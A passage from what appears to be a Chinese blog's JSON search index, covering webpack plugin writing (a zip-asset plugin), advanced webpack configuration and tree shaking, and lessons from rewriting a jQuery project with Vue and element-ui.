HelloAsyncPlugin;\n```\n\n[更多介绍](https://webpack.docschina.org/contribute/writing-a-plugin/#%E5%BC%82%E6%AD%A5%E4%BA%8B%E4%BB%B6%E9%92%A9%E5%AD%90)\n","tags":["webpack"],"categories":["工具"]},{"title":"编写一个webpack插件","url":"%2Fwebpack-plugin%2F","content":"\n# 概述\n\n插件向第三方开发者提供了 webpack 引擎中完整的能力。本文将分两部分，第一部分介绍下插件编写的基本要求及基础 demo，第二部分介绍一个实际的插件开发过程。对于webpack的插件机制建另一篇博文[webpack插件机制](/webpack-plugin-mechanism)。\n\n<!-- more -->\n\n# 详述\n\n## 最简插件\n\n最低要求，定义一个具名函数，原型提供一个 apply 方法：\n\n```js\nclass DemoPlugin {\n  apply() {\n    console.log('hello demo-plugin');\n  }\n}\nmodule.exports = DemoPlugin;\n```\n\n使用：\n\n```js\n// webpack.config.js\nconst DemoPlugin = require('./plugins/demo-plugin');\n\nmodule.exports = {\n  ...\n  plugins: [\n    new DemoPlugin({\n      name: 'jovy'\n    })\n  ]\n}\n```\n\n## 基本结构\n\n- 一个具名 JavaScript 函数。\n- 在它的原型上定义 apply 方法。\n- 指定一个触及到 webpack 本身的 事件钩子。\n- 操作 webpack 内部的实例特定数据。\n- 在实现功能后调用 webpack 提供的 callback。\n\n```js\n// 一个 JavaScript class\nclass MyExampleWebpackPlugin {\n  // 将 `apply` 定义为其原型方法，此方法以 compiler 作为参数\n  apply(compiler) {\n    // 指定要附加到的事件钩子函数\n    compiler.hooks.emit.tapAsync(\n      'MyExampleWebpackPlugin',\n      (compilation, callback) => {\n        console.log('This is an example plugin!');\n        console.log(\n          'Here’s the `compilation` object which represents a single build of assets:',\n          compilation\n        );\n\n        // 使用 webpack 提供的 plugin API 操作构建结果\n        compilation.addModule(/* ... */);\n\n        callback();\n      }\n    );\n  }\n}\n```\n\n## 实战一个压缩资源为 zip 的插件\n\n### 知识准备\n\n#### 通过 Compilation 进行文件写入\n\nCompilation 上的 assets 可以用于文件写入，可以将 zip 资源包设置到 compilation.assets 对象上，文件写入需要使用 [webpack-sources](https://www.npmjs.com/package/webpacksources)。\n\n```js\nconst { RawSource } = require('webpack-sources');\nmodule.exports = class DemoPlugin {\n  constructor(options) {\n    this.options = options;\n  }\n  apply(compiler) {\n    const { name } = this.options;\n    compiler.hooks.emit.tapAsync('ZipPlugin', (compilation, callback) => {\n      compilation.assets[name] = new RawSource('demo');\n      cb();\n    });\n  }\n};\n```\n\n#### Node.js 里面将文件压缩为 zip 包\n\n使用[jszip](https://www.npmjs.com/package/jszip)\n\n```js\nvar zip = new JSZip();\nzip.file('Hello.txt', 'Hello World\\n');\nvar img = zip.folder('images');\nimg.file('smile.gif', imgData, { base64: true });\nzip.generateAsync({ type: 'blob' }).then(function(content) {\n  // see FileSaver.js\n  saveAs(content, 'example.zip');\n});\n```\n\n### 环境搭建\n\n一个基础的 webpack 环境即可，目录示例如下：\n![目录结构](01.jpg)\n\n```js\n// package.json\n{\n  \"name\": \"my-plugin\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"build\": \"webpack\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"devDependencies\": {\n    \"webpack\": \"^4.40.2\",\n    \"webpack-cli\": \"^3.3.9\"\n  },\n  \"dependencies\": {\n    \"jszip\": \"^3.2.2\",\n    \"webpack-sources\": \"^1.4.3\"\n  }\n}\n```\n\n### 具体编写\n\n安装具体 node 包及配置 scripts：\n\n```js\n// package.json\n{\n  \"name\": \"my-plugin\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"build\": \"webpack\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"devDependencies\": {\n    \"webpack\": \"^4.40.2\",\n    \"webpack-cli\": \"^3.3.9\"\n  },\n  \"dependencies\": {\n    \"jszip\": \"^3.2.2\",\n    \"webpack-sources\": \"^1.4.3\"\n  }\n}\n\n```\n\n`ZipPlugin`插件编写：\n\n```js\n// zip-plugin.js\nconst JSZip = require('jszip');\nconst { RawSource } = require('webpack-sources');\n\nconst zip = new JSZip();\n\nclass ZipPlugin {\n  constructor(options) {\n    this.options = options;\n  }\n\n  apply(compiler) {\n    compiler.hooks.emit.tapAsync('ZipPlugin', (compilation, callback) => {\n      const folder = zip.folder(this.options.filename);\n      for (let filename in compilation.assets) {\n        let source = compilation.assets[filename].source();\n        folder.file(filename, source);\n      }\n\n      zip\n        .generateAsync({\n          type: 'nodebuffer'\n        })\n        .then(content => {\n          const outputPath = this.options.filename + '.zip';\n\n          compilation.assets[outputPath] = new RawSource(content);\n\n          callback();\n        });\n    });\n  }\n}\n\nmodule.exports = ZipPlugin;\n```\n\n`ZipPlugin`插件使用：\n\n```js\nconst path = require('path');\nconst ZipPlugin = require('./plugins/zip-plugin');\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    filename: 'main.js',\n    path: path.join(__dirname, './dist')\n  },\n  plugins: [\n    new ZipPlugin({\n      filename: 'offline'\n    })\n  ]\n};\n```\n\n`ZipPlugin`测试：\n\n```shell\nnpm run build\n```\n\n![ZipPlugin使用效果](02.jpg)\n\n# 参考\n\nhttps://webpack.docschina.org/contribute/writing-a-plugin/\n\nhttps://webpack.docschina.org/api/compiler-hooks/#emit\n\nhttps://webpack.docschina.org/api/plugins/#%E6%8F%92%E4%BB%B6%E7%B1%BB%E5%9E%8B-plugin-types-\n\n《极客时间》\n","tags":["webpack"],"categories":["工具"]},{"title":"webpack进阶用法二","url":"%2Fwebpack-advance-2%2F","content":"\n# 概述\n\n本文介绍的 webpack 用法有：Scope Hosting 的使用和原理分析、代码分割和动态 import、在 webpack 中使用 ESLint、webpack 打包组件和基础库和优化构建时命令行的显示日志。\n\n<!-- more -->\n\n# 详述\n\n## Scope Hosting 的使用和原理分析\n\n### 构建后的代码存在大量闭包代码\n\n大量作用域包裹代码，导致体积增大（模块越多越明显）；运行代码时创建的函数作用域变多，内存开销变大。\n![构建代码示例图](scope-hoisting.jpg)\n\n### webpack 的模块机制\n\n![](module.jpg)\n\n### 原理\n\n将所有模块的代码按照引用顺序放在一个函数作用域里，然后适当的重命名一些变量以防止变量名冲突。\n\n### 使用\n\n要求必须是 ES6 语法（原因同上一篇 tree shaking），CommonJS 不支持。若是 webpack4.x 设置 mode 为 production 后默认开启，之前版本及其他模式需要显式引用`ModuleConcatenationPlugin`插件，示例如下：\n\n```js\n// webpack.config.js\nconst webpack = require('webpack')\nmodule.exports = {\n  ...\n  plugins: [new webpack.optimize.ModuleConcatenationPlugin()]\n};\n```\n\n## 代码分割和动态 import\n\n对于大的 web 应用，把所有代码放到一个文件显然不合适，一般会根据需要进行分割。常见处理方式有：提出公共代码，见上一篇“提取页面公共资源”部分；脚本懒加载，使得初始加载的代码更小。\n\n### 懒加载 JS 方式\n\n- CommonJS：require.ensure\n- ES6：动态 import（目前还没有原生支持，需要 babel 转换）\n\n### 动态 import\n\n#### 安装配置：\n\n```shell\nnpm install @babel/plugin-syntax-dynamic-import -D\n```\n\n```json\n// .babelrc\n{\n  \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"],\n  \"plugins\": [\"@babel/plugin-syntax-dynamic-import\"]\n}\n```\n\n#### 打包后效果示例：\n\n![](import.jpg)\n\n#### 懒加载使用示例：\n\n```js\n// text.js\nimport React from 'react';\n\nexport default () => <div>动态 import</div>;\n```\n\n```js\n// index.js\n'use strict';\n\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport '../../common/index';\nimport logo from './images/logo.png';\nimport './search.less';\n\nclass Search extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      Text: null\n    };\n  }\n\n  loadComponent() {\n    import('./text.js').then(textModule => {\n      this.setState({\n        Text: textModule.default\n      });\n    });\n  }\n  render() {\n    const { Text } = this.state;\n    return (\n      <div className='search-text'>\n        {Text ? <Text></Text> : null}\n        搜索文字的内容\n        <img src={logo} onClick={this.loadComponent.bind(this)} />\n      </div>\n    );\n  }\n}\n\nReactDOM.render(<Search />, document.getElementById('root'));\n```\n\n## 在 webpack 中使用 ESLint\n\n以下以基于 Airbnb 的 eslint 规则库的使用为例\n\n### 安装依赖包\n\n```shell\n# airbnb的eslint规则库\nnpm i eslint-config-airbnb -D\n# airbnb的eslint规则库依赖包\nnpm i eslint eslint-plugin-import eslint-plugin-react eslint-plugin-react-hooks eslint-plugin-jsx-a11y -D\n# eslint解析器\nnpm i babel-eslint -D\n# webpack loader\nnpm i eslint-loader -D\n```\n\n### 配置 eslint 和 webpack\n\n```js\n// .eslintrc.js\nmodule.exports = {\n  parser: 'babel-eslint',\n  extends: 'airbnb',\n  env: {\n    browser: true,\n    node: true\n  },\n  rules: {}\n};\n```\n\n```js\n// webpack.config.js\nmodule.exports = {\n    ...\n    module: {\n        rules: [\n            {\n                test: /\\.(js|jsx)$/,\n                exclude: /node_modules/,\n                use: ['babel-loader', {\n                    loader: 'eslint-loader',\n                    options: {\n                        fix: true\n                    }\n                }]\n            }\n        ]\n    }\n}\n```\n\n## webpack 打包组件和基础库\n\nwebpack 除了可以用来打包应用，也可以用来打包 js 库，当然可能打包 js 库用 rollup 更适合。本次以实现一个大整数加法库为例讲下实现过程。\n\n要求：\n\n- 需要打包压缩版 large-number-jovy.min.js 和非压缩版本 large-number-jovy.js；\n- 支持 AMD/CJS/ESM 模块引入和 Script 标签引入；\n\n目录结构：\n![large-number项目结构图](large-number.jpg)\n\n安装配置：\n\n```shell\nnpm i terser-webpack-plugin -D\n```\n\n```js\nconst TerserPlugin = require('terser-webpack-plugin');\n\nmodule.exports = {\n  mode: 'none',\n  entry: {\n    'large-number-jovy': './src/index.js',\n    'large-number-jovy.min': './src/index.js'\n  },\n  output: {\n    filename: '[name].js',\n    library: 'largeNumberJovy', //指定库的全局变量\n    libraryExport: 'default',\n    libraryTarget: 'umd' //支持库引入的方式\n  },\n  optimization: {\n    minimize: true,\n    minimizer: [\n      new TerserPlugin({\n        include: /\\.min\\.js$/\n      })\n    ]\n  }\n};\n```\n\n设置入口文件：\n\npackage.json 的 main 字段为 index.js\n\n```js\n// index.js\nif (process.env.NODE_ENV === 'production') {\n  module.exports = require('./dist/large-number-jovy.min.js');\n} else {\n  module.exports = require('./dist/large-number-jovy.js');\n}\n```\n\n发布：\n_默认已经在 npm 注册了账号，并且登录了，否则请先注册登录。_\n\n```shell\nnpm publish\n```\n\n查看：\n![large-number发布成功图](large-number2.jpg)\n\n使用：\n\n```shell\n# 安装\nnpm i large-number-jovy -S\n```\n\n```js\n// react\nimport LargeNumber from 'large-number-jovy';\n...\n{LargeNumber('999999', '1')}\n```\n\n## 优化构建时命令行的显示日志\n\n每次构建命令行都会显示很多日志信息，我们是不是可以定制显示信息呢？例如只显示错误日志。答案是当然可以，了解下[stats](https://webpack.docschina.org/configuration/stats/#src/components/Sidebar/Sidebar.jsx)配置项。stats 值为 String 或者 Object，字符串值是内置的一套规则的名称，有如下几种：\n\n- error-only：只在发生错误时输出\n- minimal：只在发生错误或有新的编译时输出\n- none：没有输出\n- normal：标准输出\n- verbose：全部输出\n\n```js\n// webpack.config.js\n// 对于 webpack-dev-server，这个属性要放在 devServer 对象里。\nmodule.exports = {\n  //...\n  stats: 'errors-only'\n};\n```\n\n当然更详细配置可以用对象来罗列具体每条规则。\n\n```js\n// webpack.config.js\n\nmodule.exports = {\n  //..\n  stats: {\n    // copied from `'minimal'`\n    all: false,\n    modules: true,\n    maxModules: 0,\n    errors: true,\n    warnings: true,\n    // our additional options\n    moduleTrace: true,\n    errorDetails: true\n  }\n};\n```\n\n实际使用中，我们发现内置的过于简单，详细配置又过于繁琐，有没有更加友好的插件呢？\n\n### `friendly-errors-webpack-plugin`的使用\n\n```js\n// webpack.config.js\nmodule.exports = {\n  // ..\n  plugins: [new FriendlyErrorsWebpackPlugin()],\n  stats: 'errors-only'\n};\n```\n\n使用后效果：\n![friendly-errors-webpack-plugin使用效果图](error.jpg)\n\n# 参考\n\n《极客时间》\n","tags":["webpack"],"categories":["工具"]},{"title":"webpack进阶用法一","url":"%2Fwebpack-advance-1%2F","content":"\n# 概述\n\n本文介绍的 webpack 用法有：自动清理构建目录、自动补齐 CSS3 前缀、移动端 CSS 中的 px 自动转成 rem、静态资源内联、多页面应用打包通用方案、使用 source map、提取页面公共资源和 tree shaking 的使用和原理分析。\n\n<!-- more -->\n\n# 详述\n\n## 自动清理构建目录\n\n若频次很低，我们可以直接手动删除已构建文件。但是实际中我们要经常执行构建命令，这时候就需要自动清理构建目录文件了。思路一是用`npm scripts`，直接用系统命令：`rm -rf ./dist && webpack`，或者用 npm 包 rimraf：`rimraf ./dist && webpack`。思路二是用 webpack 插件`clean-webpack-plugin`，使用很简单，安装配置下即可，完成后每次构建就会自动清理已构建的目录文件。\n\n```js\n// package.json\n  \"scripts\": {\n    \"build\": \"rm -rf ./dist && webpack --config webpack.prod.js\",\n    // \"build\": \"rimraf ./dist && webpack --config webpack.prod.js\",\n  }\n```\n\n```js\n// webpack.config.js\nplugins: [new CleanWebpackPlugin()];\n```\n\n## 自动补齐 CSS3 前缀\n\n由于各种浏览器对于 CSS3 新特性支持程度的不同，导致实际使用中需要针对不同内核浏览器给出前缀，示例如下：\n\n```css\n.box {\n  -moz-border-radius: 10px;\n  -webkit-border-radius: 10px;\n  -o-border-radius: 10px;\n  border-radius: 10px;\n}\n```\n\n实际生产中我们当然不想这么低效率，因此可以使用构建工具来自动完成这些。在 webpack 中可以使用 PostCSS 插件 autoprefixer 来实现。至于哪些属性需要加前缀，主要是根据配置的 browserslist 和[Can I Use](https://caniuse.com/)规则确定。具体使用，首先安装 npm 包`postcss-loader`和`autoprefixer`，然后配置具体参数，最后示例如下：\n\n```js\n// webpack.config.js\n  {\n      test: /.css$/,\n      use: [\n          'css-loader',\n          {\n              loader: 'postcss-loader',\n              options: {\n                  plugins: () => [\n                      require('autoprefixer')()\n                  ]\n              }\n          }\n      ]\n  },\n```\n\n```js\n// package.json\n  \"browserslist\": [\n    \"last 2 version\",\n    \"> 1%\",\n    \"iOS 7\"\n  ],\n```\n\n## 移动端 CSS 中的 px 自动转成 rem\n\n![终端分辨率对比图](px2rem.jpg)\n为什么要转换，因为各终端分辨率不同，px 是绝对单位，想要响应式布局，就得针对不同分辨率作相应的调整。思路一是用媒体查询：\n\n```css\n@media screen and (max-width: 980px) {\n  .header {\n    width: 900px;\n  }\n}\n@media screen and (max-width: 480px) {\n  .header {\n    height: 400px;\n  }\n}\n@media screen and (max-width: 350px) {\n  .header {\n    height: 300px;\n  }\n}\n```\n\n思路二是用相对单位 rem，rem 是相对于页面根元素 html 的大小来确定其他元素的大小。使用 rem，条件一是动态设置 html 的 font-size，条件二是根据视觉稿编写具体元素的对应 px 的 rem 值。计算根元素的 font-size 值可以使用手淘的[lib-flexible](https://github.com/amfe/lib-flexible)库，px 转成 rem 可以利用样式预编译库的类函数功能去实现，也可以利用构建工具去处理。推荐`lib-flexible`+`px2rem-loader`，示例如下：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <title>Document</title>\n    <script>\n      // lib-flexible库代码\n    </script>\n  </head>\n  <body></body>\n</html>\n```\n\n```js\n{\n    test: /.css$/,\n    use: [\n        'css-loader',\n        {\n            loader: 'px2rem-loader',\n            options: {\n                remUnit: 75,\n                remPrecision: 8\n            }\n        }\n    ]\n}\n```\n\n## 静态资源内联\n\n资源内联意义有：页面框架的初始化脚本、上报相关打点、css 内联避免页面闪动和减少 http 网络请求数。\n\n### HTML 和 JS 内联\n\n可以用 webpack 的 raw-loader 实现，示例如下（raw-loader@0.5.1）：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    ${require('raw-loader!./meta.html')}\n    <title>Document</title>\n    <script>\n      ${require('raw-loader!babel-loader!../../node_modules/lib-flexible/flexible.js')}\n    </script>\n  </head>\n  <body>\n    <div id=\"root\"></div>\n  </body>\n</html>\n```\n\n### CSS 内联\n\n用 webpack 的 style-loader\n\n```js\nmodule: {\n  rules: [\n    {\n      test: /\\.scss$/,\n      use: [\n        {\n          loader: 'style-loader',\n          options: {\n            insertAt: 'top', // 样式插入到<head>\n            singleton: true //将所有的style标签合并成一个\n          }\n        },\n        'css-loader',\n        'sass-loader'\n      ]\n    }\n  ];\n}\n```\n\n### 小图片或者字体内联\n\n用 webpack 的 url-loader\n\n```js\nmodule: {\n  rules: [\n    {\n      test: /.(png|jpg|gif|jpeg)$/,\n      use: [\n        {\n          loader: 'url-loader',\n          options: {\n            limit: 10240\n          }\n        }\n      ]\n    },\n    {\n      test: /.(woff|woff2|eot|ttf|otf)$/,\n      use: [\n        {\n          loader: 'url-loader',\n          options: {\n            limit: 10240\n          }\n        }\n      ]\n    }\n  ];\n}\n```\n\n## 多页面应用打包通用方案\n\n思路一，每个页面对应一个 entry，一个 html-webpack-plugin，缺点就是增删页面需要修改 webpack 配置文件。\n思路二，动态获取 entry 和设置 html-webpack-plugin 数量，前提是约定各个页面文件结构，例如每个页面一个单独文件夹，每个入口文件名都为 index.js。示例如下：\n\n```js\n// webpack.config.js\n'use strict';\n\nconst glob = require('glob');\nconst path = require('path');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\nconst { CleanWebpackPlugin } = require('clean-webpack-plugin');\n\nconst setMPA = () => {\n  const entry = {};\n  const htmlWebpackPlugins = [];\n\n  const entryFiles = glob.sync(path.join(__dirname, './src/*/index.js'));\n\n  Object.keys(entryFiles).map(index => {\n    const entryFile = entryFiles[index];\n    const match = entryFile.match(/src\\/(.*)\\/index\\.js/);\n    const fileName = match && match[1];\n    entry[fileName] = entryFile;\n\n    htmlWebpackPlugins.push(\n      new HtmlWebpackPlugin({\n        template: path.join(__dirname, `src/${fileName}/index.html`),\n        filename: `${fileName}.html`,\n        chunks: ['vendors', fileName],\n        inject: true,\n        minify: {\n          html5: true,\n          collapseWhitespace: true,\n          preserveLineBreaks: false,\n          minifyCSS: true,\n          minifyJS: true,\n          removeComments: false\n        }\n      })\n    );\n  });\n\n  return {\n    entry,\n    htmlWebpackPlugins\n  };\n};\n\nconst { entry, htmlWebpackPlugins } = setMPA();\n\nmodule.exports = {\n  entry: entry,\n  output: {\n    path: path.join(__dirname, 'dist'),\n    filename: '[name]_[chunkhash:8].js'\n  },\n\n  plugins: [new CleanWebpackPlugin()].concat(htmlWebpackPlugins)\n};\n```\n\n这个示例中使用了 npm 包`glob`来读文件，当然也可以直接用 node 的 fs 模块实现，或者其他功能包。\n\n## 使用 source map\n\n作用是通过 source map 定位到源代码，主要用于调试，所以开发环境开启，线上环境关闭。source map 类型很多，重点是掌握几个关键字的含义，然后各种类型含义也只是关键字的组合。关键字含义如下：\n\n- source map: 产生.map 文件\n- eval: 使用 eval 包裹模块代码\n- cheap: 不包含列信息\n- inline: 将.map 作为 DataURI 嵌入，不单独生成.map 文件\n- module: 包含 loader 的 sourcemap\n\n## 提取页面公共资源\n\n### 基础库分离\n\n将 react、react-dom 基础包通过 cdn 引入，不打入 bundle 中，可以使用`html-webpack-externals-plugin`实现：\n\n```js\n// webpack.config.js\nconst HtmlWebpackExternalsPlugin = require('html-webpack-externals-plugin');\nmodule.exports = {\n  plugins: [\n    new HtmlWebpackExternalsPlugin({\n      externals: [\n        {\n          module: 'react',\n          entry: 'https://unpkg.com/react@16/umd/react.production.min.js',\n          global: 'React'\n        },\n        {\n          module: 'react-dom',\n          entry:\n            'https://unpkg.com/react-dom@16/umd/react-dom.production.min.js',\n          global: 'ReactDOM'\n        }\n      ]\n    })\n  ]\n};\n```\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <title>Document</title>\n  </head>\n  <body>\n    <div id=\"root\"></div>\n    <script src=\"https://unpkg.com/react@16/umd/react.production.min.js\"></script>\n\n    <script src=\"https://unpkg.com/react-dom@16/umd/react-dom.production.min.js\"></script>\n  </body>\n</html>\n```\n\n### 利用 SplitChunksPlugin 进行公共脚本分离\n\n利用 SplitChunksPlugin 分离基础包\n\n```js\nmodule.exports = {\n  optimization: {\n    splitChunks: {\n      cacheGroups: {\n        commons: {\n          test: /(react|react-dom)/, //匹配出需要分离的包\n          name: 'vendors',\n          chunks: 'all'\n        }\n      }\n    }\n  }\n};\n```\n\n利用 SplitChunksPlugin 分离页面公共文件\n\n```js\nmodule.exports = {\n  optimization: {\n    splitChunks: {\n      minSize: 0, //分离的包体积的大小\n      cacheGroups: {\n        commons: {\n          name: 'commons',\n          chunks: 'all',\n          minChunks: 2 //设置最小引用次数为2次\n        }\n      }\n    }\n  }\n};\n```\n\n## tree shaking 的使用和原理分析\n\n### 概念\n\n一个模块可能有多个方法，只要其中的某个方法使用到了，则整个文件都会被打到 bundle 里面去，tree shaking 就是只把用到的方法打入 bundle，没用到的方法会在 uglify 阶段被擦除掉。\n\n### 使用\n\nwebpack4.x 在 `mode` 设置为 `production` 时默认开启，webpack3.x 与 webpack2.x 在.babelrc 里设置 `modules: false` 即可：\n\n```js\n{\n  \"presets\": [\n    [\"env\", {\n      \"modules\": false  //关键点，设置babel不用对ES6的import编译成require形式\n    }],\n    \"stage-2\",\n    \"react\"\n  ]\n}\n```\n\n### DCE (Dead code elimination)\n\n在保持代码运行结果不变的前提下，去除无用的代码。\n\n- 代码执行的结果不会被用到\n- 代码不会被执行，不可到达\n- 代码只会影响死变量（只写不读）\n\ntree shaking 是 DCE 的一种方式，它可以在打包时忽略没有用到的代码。\n\n```js\nif (false) {\n  console.log('这段代码永远不会执行’);\n}\n```\n\n### 原理\n\n利用 ES6 模块的特点（只能作为模块顶层的语句出现、import 的模块名只能是字符串常量和引入的模块不可改变），在打包阶段对静态代码进行语法分析，对有用和无用的模块打上不同标签，“uglify”阶段删除无用代码。\n\n### 局限性\n\n1，只能是静态声明和引用的 ES6 模块，不能是动态引入和声明的；\n\n在打包阶段对冗余代码进行删除，就需要 webpack 需要在打包阶段确定模块文件的内部结构，而 ES 模块的引用和输出必须出现在文件结构的第一级（'import' and 'export' may only appear at the top level），否则会报错。\n\n```js\n// webpack编译时会报错\nif (condition) {\n  import module1 from './module1';\n} else {\n  import module2 from './module2';\n}\n```\n\n而 CommonJS 模块支持动态结构的，所以不能对 CommonJS 模块进行 tree-shaking 处理。\n\n2，只能处理模块级别，不能处理函数级别的冗余；\n因为 webpack 的 tree-shaking 是基于模块间的依赖关系，所以并不能对模块内部自身的无用代码进行删除。\n\n3，只能处理 JS 相关冗余代码，不能处理 CSS 冗余代码。\n\n[更多介绍](https://www.jianshu.com/p/7994b1fc6dfe)\n\n# 参考\n\nhttps://www.jianshu.com/p/7994b1fc6dfe\n\n《极客时间》\n","tags":["webpack"],"categories":["工具"]},{"title":"Vue重构jQuery项目经验总结一","url":"%2FVue-restructure-jQuery-1%2F","content":"\n# 概述\n\n用 Vue 生态重构已有的老项目（jsp+jquery），针对目前实践中遭遇的一些坑，做下小结。具体包括：URL 转换规则、element-ui 自定义校验、`el-table`组件删除问题、自定义组件`v-model`使用和`sync`修饰符。\n\n<!-- more -->\n\n# 详述\n\n初始化项目直接用的 vue-cli，安装全家桶（router、vuex），代码规范选用的 Prettier，配置文件选择放在单独文件，ui 库用 element-ui。\n\n## URL 转换规则\n\n对于资源的引用路径，可以用相对路径，也可以用绝对路径，但是实际中，对于嵌套太深的一般使用绝对路径比较合适。在 vue-cli 初始化的项目中默认设置了`@`别名作为 src 根目录，当然我们也可以在 webpack 配置文件中设置更多的别名。\n\n在 js 中引用资源的相对路径与绝对路径示例如下：\n\n```js\n// 简洁\nimport MainTitle from \"@/components/MainTitle\";\n// 复杂，容易搞错层级\nimport MainTitle from \"../../../components/MainTitle\";\n```\n\n既然使用别名这么方便，那么在 css 中引用图片也这样搞吧:\n\n```scss\n.select-flag {\n  &:before {\n    content: \"\";\n    width: 16px;\n    height: 11px;\n    display: inline-block;\n    margin-right: 5px;\n    font-size: 0;\n    background: url(\"@/assets/milan/common/img/icon/flags.png\") no-repeat;\n  }\n}\n```\n\n结果报错如下：\n\n```\nFailed to compile.\n\n./src/components/CountrySelect/index.vue?vue&type=style&index=0&id=432f6435&lang=scss&scoped=true& (./node_modules/css-loader??ref--8-oneOf-1-1!./node_modules/vue-loader/lib/loaders/stylePostLoader.js!./node_modules/postcss-loader/src??ref--8-oneOf-1-2!./node_modules/sass-loader/lib/loader.js??ref--8-oneOf-1-3!./node_modules/cache-loader/dist/cjs.js??ref--0-0!./node_modules/vue-loader/lib??vue-loader-options!./src/components/CountrySelect/index.vue?vue&type=style&index=0&id=432f6435&lang=scss&scoped=true&)\nModule not found: Error: Can't resolve './@/assets/milan/common/img/icon/flags.png' in 'H:\\workspace\\vue\\venice\\src\\components\\CountrySelect'\n```\n\n细看这个报错信息，可知 css-loader 编译时没有找到引用的资源。解决方式为：`background: url(\"~@/assets/milan/common/img/icon/flags.png\") no-repeat;`。原因是，`@`与`~`开头都会作为一个模块请求被解析，但是`@`开头仅作用域模板中。详细见[官网](https://cli.vuejs.org/zh/guide/html-and-static-assets.html#url-%E8%BD%AC%E6%8D%A2%E8%A7%84%E5%88%99)。\n\n## element-ui 自定义校验\n\nelement 的表单校验与 ant-d 一样都是用的第三方库[async-validator\n](https://github.com/yiminghe/async-validator/blob/master/README.md)。因为 element-ui 官网这块只是一带而过，详细的还是要查看该集成库的文档。下面以自定义同步校验与异步校验为例：\n\n```js\n  ...\n  data() {\n\n    var phoneRepeat = (rule, value, callback) => {\n      request({\n        url: \"/api/account/phoneRepeat\",\n        method: \"post\",\n        params: { regionId: this.ruleForm.regionId, phone: value }\n      }).then(response => {\n        let result = response.data;\n        if (result.code == \"10002\") {\n          callback(new Error(rule.message));\n        } else {\n          callback();\n        }\n      });\n    };\n    var telNumCn = (rule, value, callback) => {\n      var reg = /^1\\d{10}$/;\n      if (this.ruleForm.regionId === \"China\" && !reg.test(value)) {\n        callback(new Error(rule.message));\n      } else {\n        callback();\n      }\n    };\n\n    return {\n      titleTxt: \"管理子账户 \",\n      titleDesc: \"仅提供业务员身份的子账户，用于管理除资金以外的所有权限。\",\n      ruleForm: {\n        type: \"01\",\n        name: \"\",\n        email: \"\",\n        regionId: \"China\",\n        phone: \"\",\n        password: \"\",\n        repeatpwd: \"\"\n      },\n      rules: {\n        phone: [\n          {\n            required: true,\n            message: \"请输入手机号码。\",\n            trigger: \"blur\"\n          },\n          {\n            validator: telNumCn,\n            required: true,\n            message: \"请提供有效的中国大陆手机号码。\",\n            trigger: \"blur\"\n          },\n          {\n            validator: phoneRepeat,\n            required: true,\n            message: \"此手机已被作为安全手机使用过，请更换。\",\n            trigger: \"blur\"\n          }\n        ]\n      }\n    };\n  },\n  ...\n```\n\n想着校验函数复用，一开始根据 element 示例，想着用一个高阶函数传入 message 生成 validator 函数。后来发现`rule`参数就是指向我们配置的规则对象，因此直接在 rules 中配置 message 即可，当然也可以增加其他参数供 validator 函数使用。\n\n## `el-table`组件删除问题\n\n问题很小，就是用了官方示例，删除成功，但是不是对应的那一条：\n![效果图](GIF.gif)\n检查代码：\n\n```html\n<el-table\n  :data=\"tableData\"\n  style=\"width: 100%\"\n  :default-sort=\"{prop: 'name', order: 'descending'}\"\n>\n  <el-table-column prop=\"name\" label=\"姓名\" sortable sort-by=\"name\" />\n  <el-table-column prop=\"type\" label=\"类型\" />\n  <el-table-column prop=\"email\" label=\"登录邮箱\" />\n  <el-table-column prop=\"phone\" label=\"安全手机\" />\n  <el-table-column prop=\"time\" label=\"添加时间\" sortable sort-by=\"time\" />\n  <el-table-column label=\"操作\" width=\"100\">\n    <template v-slot=\"scope\">\n      <el-button type=\"text\" @click=\"handleEdit(scope.$index, scope.row)\"\n        >编辑</el-button\n      >\n      <el-button type=\"text\" @click=\"handleDelete(scope.$index, scope.row)\"\n        >删除</el-button\n      >\n    </template>\n  </el-table-column>\n</el-table>\n```\n\n```js\n    handleDelete(index, row) {\n      ...\n      this.tableData.splice(index, 1);\n      ...\n    }\n```\n\n没啥问题啊。唉！最后发现加了默认排序，导致展示的顺序与实际的数据顺序不一致，当然根据索引删除也就对不上号了。因此，有排序的，只能通过唯一性的字段，如id，来进行查询筛选了。\n\n## 自定义组件 v-model 使用\n\n一个组件上的 v-model 默认会利用名为 value 的 prop 和名为 input 的事件，但是像单选框、复选框等类型的输入控件可能会将 value 特性用于不同的目的。model 选项可以用来避免这样的冲突：\n\n```HTML\n<my-checkbox v-model=\"foo\" value=\"some value\"></my-checkbox>\n```\n\n```JS\nVue.component('my-checkbox', {\n  model: {\n    prop: 'checked',\n    event: 'change'\n  },\n  props: {\n    // this allows using the `value` prop for a different purpose\n    value: String,\n    // use `checked` as the prop which take the place of `value`\n    checked: {\n      type: Number,\n      default: 0\n    }\n  },\n  // ...\n})\n```\n\n## sync 修饰符\n\n原以为加了 sync 的 prop 就可以像普通的 data 定义变量一样使用，结果当然是错的。其实只是一种针对通过自定义事件修改 prop 的一种简写。使用这种简写的前提是约定自定义事件名为`update:xxx`，其实只是通过约定，减少了传入事件函数，对于子组件还是需要调用`$emit`方法去触发。示例如下：\n\n```html\n<text-document\n  v-bind:title=\"doc.title\"\n  v-on:update:title=\"doc.title = $event\"\n></text-document>\n<!-- 可以简写成这样： -->\n<text-document v-bind:title.sync=\"doc.title\"></text-document>\n```\n\n```js\n// 子组件中触发赋值意图\nthis.$emit(\"update:title\", newTitle);\n```\n","tags":["Vue"],"categories":["Vue"]},{"title":"React 